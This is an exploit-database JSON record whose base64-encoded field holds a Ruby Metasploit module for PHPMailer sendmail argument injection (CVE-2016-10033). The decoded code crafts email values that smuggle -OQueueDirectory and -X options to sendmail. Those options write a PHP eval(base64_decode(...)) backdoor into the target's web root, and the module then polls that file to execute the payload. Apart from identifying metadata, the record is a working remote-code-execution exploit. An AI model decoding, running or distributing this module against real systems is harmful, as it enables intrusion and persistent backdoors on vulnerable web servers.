{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBNYW51YWxSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkZpbGVEcm9wcGVyDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ1BIUE1haWxlciBTZW5kbWFpbCBBcmd1bWVudCBJbmplY3Rpb24nLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICAgUEhQTWFpbGVyIHZlcnNpb25zIHVwIHRvIGFuZCBpbmNsdWRpbmcgNS4yLjE5IGFyZSBhZmZlY3RlZCBieSBhDQogICAgICAgIHZ1bG5lcmFiaWxpdHkgd2hpY2ggY2FuIGJlIGxldmVyYWdlZCBieSBhbiBhdHRhY2tlciB0byB3cml0ZSBhIGZpbGUgd2l0aA0KICAgICAgICBwYXJ0aWFsbHkgY29udHJvbGxlZCBjb250ZW50cyB0byBhbiBhcmJpdHJhcnkgbG9jYXRpb24gdGhyb3VnaCBpbmplY3Rpb24NCiAgICAgICAgb2YgYXJndW1lbnRzIHRoYXQgYXJlIHBhc3NlZCB0byB0aGUgc2VuZG1haWwgYmluYXJ5LiBUaGlzIG1vZHVsZQ0KICAgICAgICB3cml0ZXMgYSBwYXlsb2FkIHRvIHRoZSB3ZWIgcm9vdCBvZiB0aGUgd2Vic2VydmVyIGJlZm9yZSB0aGVuIGV4ZWN1dGluZw0KICAgICAgICBpdCB3aXRoIGFuIEhUVFAgcmVxdWVzdC4gVGhlIHVzZXIgcnVubmluZyBQSFBNYWlsZXIgbXVzdCBoYXZlIHdyaXRlDQogICAgICAgIGFjY2VzcyB0byB0aGUgc3BlY2lmaWVkIFdFQl9ST09UIGRpcmVjdG9yeSBhbmQgc3VjY2Vzc2Z1bCBleHBsb2l0YXRpb24NCiAgICAgICAgY2FuIHRha2UgYSBmZXcgbWludXRlcy4NCiAgICAgIH0sDQogICAgICAnQXV0aG9yJyAgICAgICAgID0+IFsNCiAgICAgICAgJ0Rhd2lkIEdvbHVuc2tpJywgICAjIHZ1bG5lcmFiaWxpdHkgZGlzY292ZXJ5IGFuZCBvcmlnaW5hbCBQb0MNCiAgICAgICAgJ1NwZW5jZXIgTWNJbnR5cmUnICAjIG1ldGFzcGxvaXQgbW9kdWxlDQogICAgICBdLA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgPT4gWw0KICAgICAgICBbJ0NWRScsICcyMDE2LTEwMDMzJ10sDQogICAgICAgIFsnQ1ZFJywgJzIwMTYtMTAwNDUnXSwNCiAgICAgICAgWydFREInLCAnNDA5NjgnXSwNCiAgICAgICAgWydFREInLCAnNDA5NjknXSwNCiAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9naXRodWIuY29tL29wc3hjcS9leHBsb2l0LUNWRS0yMDE2LTEwMDMzJ10sDQogICAgICAgIFsnVVJMJywgJ2h0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL1BIUE1haWxlci1FeHBsb2l0LVJlbW90ZS1Db2RlLUV4ZWMtQ1ZFLTIwMTYtMTAwMzMtVnVsbi5odG1sJ10NCiAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICdEZWMgMjYgMjAxNicsDQogICAgICAnUGxhdGZvcm0nICAgICAgID0+ICdwaHAnLA0KICAgICAgJ0FyY2gnICAgICAgICAgICA9PiBBUkNIX1BIUCwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgPT4geydEaXNhYmxlTm9wcycgPT4gdHJ1ZX0sDQogICAgICAnVGFyZ2V0cycgICAgICAgID0+IFsNCiAgICAgICAgWydQSFBNYWlsZXIgPDUuMi4xOCcsIHt9XSwNCiAgICAgICAgWydQSFBNYWlsZXIgNS4yLjE4IC0gNS4yLjE5Jywge31dDQogICAgICBdLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwDQogICAgKSkNCg0KICAgIHJlZ2lzdGVyX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ1RBUkdFVFVSSScsICBbdHJ1ZSwgJ1BhdGggdG8gdGhlIGFwcGxpY2F0aW9uIHJvb3QnLCAnLyddKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnVFJJR0dFUlVSSScsIFtmYWxzZSwgJ1BhdGggdG8gdGhlIHVwbG9hZGVkIHBheWxvYWQnLCAnJ10pLA0KICAgICAgICBPcHRTdHJpbmcubmV3KCdXRUJfUk9PVCcsICAgW3RydWUsICdQYXRoIHRvIHRoZSB3ZWIgcm9vdCcsICcvdmFyL3d3dyddKQ0KICAgICAgXSwgc2VsZi5jbGFzcykNCiAgICByZWdpc3Rlcl9hZHZhbmNlZF9vcHRpb25zKA0KICAgICAgWw0KICAgICAgICBPcHRJbnQubmV3KCdXQUlUX1RJTUVPVVQnLCBbdHJ1ZSwgJ1NlY29uZHMgdG8gd2FpdCB0byB0cmlnZ2VyIHRoZSBwYXlsb2FkJywgMzAwXSkNCiAgICAgIF0sIHNlbGYuY2xhc3MpDQogIGVuZA0KDQogIGRlZiB0cmlnZ2VyKHRyaWdnZXJfdXJpKQ0KICAgIHByaW50X3N0YXR1cygiU2xlZXBpbmcgYmVmb3JlIHJlcXVlc3RpbmcgdGhlIHBheWxvYWQgZnJvbTogI3t0cmlnZ2VyX3VyaX0iKQ0KDQogICAgcGFnZV9mb3VuZCA9IGZhbHNlDQogICAgc2xlZXBfdGltZSA9IDEwDQogICAgd2FpdF90aW1lID0gZGF0YXN0b3JlWydXQUlUX1RJTUVPVVQnXQ0KICAgIHByaW50X3N0YXR1cygiV2FpdGluZyBmb3IgdXAgdG8gI3t3YWl0X3RpbWV9IHNlY29uZHMgdG8gdHJpZ2dlciB0aGUgcGF5bG9hZCIpDQogICAgd2hpbGUgd2FpdF90aW1lID4gMA0KICAgICAgc2xlZXAoc2xlZXBfdGltZSkNCiAgICAgIHdhaXRfdGltZSAtPSBzbGVlcF90aW1lDQogICAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgICAnbWV0aG9kJyAgID0+ICdHRVQnLA0KICAgICAgICAndXJpJyAgICAgID0+IHRyaWdnZXJfdXJpDQogICAgICApDQoNCiAgICAgIGlmIHJlcy5uaWw/DQogICAgICAgIGlmIHBhZ2VfZm91bmQgb3Igc2Vzc2lvbl9jcmVhdGVkPw0KICAgICAgICAgIHByaW50X2dvb2QoJ1N1Y2Nlc3NmdWxseSB0cmlnZ2VyZWQgdGhlIHBheWxvYWQnKQ0KICAgICAgICAgIGJyZWFrDQogICAgICAgIGVuZA0KDQogICAgICAgIG5leHQNCiAgICAgIGVuZA0KDQogICAgICBuZXh0IHVubGVzcyByZXMuY29kZSA9PSAyMDANCg0KICAgICAgaWYgcmVzLmJvZHkubGVuZ3RoID09IDAgYW5kIG5vdCBwYWdlX2ZvdW5kDQogICAgICAgIHByaW50X2dvb2QoJ1N1Y2Nlc3NmdWxseSBmb3VuZCB0aGUgcGF5bG9hZCcpDQogICAgICAgIHBhZ2VfZm91bmQgPSB0cnVlDQogICAgICBlbmQNCiAgICBlbmQNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBwYXlsb2FkX2ZpbGVfbmFtZSA9ICIje3JhbmRfdGV4dF9hbHBoYW51bWVyaWMoOCl9LnBocCINCiAgICBwYXlsb2FkX2ZpbGVfcGF0aCA9ICIje2RhdGFzdG9yZVsnV0VCX1JPT1QnXX0vI3twYXlsb2FkX2ZpbGVfbmFtZX0iDQoNCiAgICBpZiB0YXJnZXQubmFtZSA9PSAnUEhQTWFpbGVyIDw1LjIuMTgnDQogICAgICBlbWFpbCA9ICJcIiN7cmFuZF90ZXh0X2FscGhhbnVtZXJpYyg0ICsgcmFuZCg4KSl9XFxcIiAtT1F1ZXVlRGlyZWN0b3J5PS90bXAgLVgje3BheWxvYWRfZmlsZV9wYXRofSAje3JhbmRfdGV4dF9hbHBoYW51bWVyaWMoNCArIHJhbmQoOCkpfVwiQCN7cmFuZF90ZXh0X2FscGhhbnVtZXJpYyg0ICsgcmFuZCg4KSl9LmNvbSINCiAgICBlbHNpZiB0YXJnZXQubmFtZSA9PSAnUEhQTWFpbGVyIDUuMi4xOCAtIDUuMi4xOScNCiAgICAgIGVtYWlsID0gIlwiI3tyYW5kX3RleHRfYWxwaGFudW1lcmljKDQgKyByYW5kKDgpKX1cXCcgLU9RdWV1ZURpcmVjdG9yeT0vdG1wIC1YI3twYXlsb2FkX2ZpbGVfcGF0aH0gI3tyYW5kX3RleHRfYWxwaGFudW1lcmljKDQgKyByYW5kKDgpKX1cIkAje3JhbmRfdGV4dF9hbHBoYW51bWVyaWMoNCArIHJhbmQoOCkpfS5jb20iDQogICAgZWxzZQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vVGFyZ2V0LCAnVGhlIHNwZWNpZmllZCB2ZXJzaW9uIGlzIG5vdCBzdXBwb3J0ZWQnKQ0KICAgIGVuZA0KDQogICAgZGF0YSA9IFJleDo6TUlNRTo6TWVzc2FnZS5uZXcNCiAgICBkYXRhLmFkZF9wYXJ0KCdzdWJtaXQnLCBuaWwsIG5pbCwgJ2Zvcm0tZGF0YTsgbmFtZT0iYWN0aW9uIicpDQogICAgZGF0YS5hZGRfcGFydCgiPD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCcje1JleDo6VGV4dC5lbmNvZGVfYmFzZTY0KHBheWxvYWQuZW5jb2RlZCl9JykpOyA/PiIsIG5pbCwgbmlsLCAnZm9ybS1kYXRhOyBuYW1lPSJuYW1lIicpDQogICAgZGF0YS5hZGRfcGFydChlbWFpbCwgbmlsLCBuaWwsICdmb3JtLWRhdGE7IG5hbWU9ImVtYWlsIicpDQogICAgZGF0YS5hZGRfcGFydCgiI3tyYW5kX3RleHRfYWxwaGFudW1lcmljKDIgKyByYW5kKDIwKSl9IiwgbmlsLCBuaWwsICdmb3JtLWRhdGE7IG5hbWU9Im1lc3NhZ2UiJykNCg0KICAgIHByaW50X3N0YXR1cygiV3JpdGluZyB0aGUgYmFja2Rvb3IgdG8gI3twYXlsb2FkX2ZpbGVfcGF0aH0iKQ0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAnbWV0aG9kJyAgID0+ICdQT1NUJywNCiAgICAgICd1cmknICAgICAgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpKSwNCiAgICAgICdjdHlwZScgICAgPT4gIm11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSN7ZGF0YS5ib3VuZH0iLA0KICAgICAgJ2RhdGEnICAgICA9PiBkYXRhLnRvX3MNCiAgICApDQoNCiAgICByZWdpc3Rlcl9maWxlc19mb3JfY2xlYW51cChwYXlsb2FkX2ZpbGVfcGF0aCkNCg0KICAgIHRyaWdnZXIobm9ybWFsaXplX3VyaShkYXRhc3RvcmVbJ1RSSUdHRVJVUkknXS5ibGFuaz8gPyB0YXJnZXRfdXJpIDogZGF0YXN0b3JlWydUUklHR0VSVVJJJ10sIHBheWxvYWRfZmlsZV9uYW1lKSkNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/multiple/webapps/41688.rb", 
    "id": "41688", 
    "cves": [
        "CVE-2016-10033"
    ]
}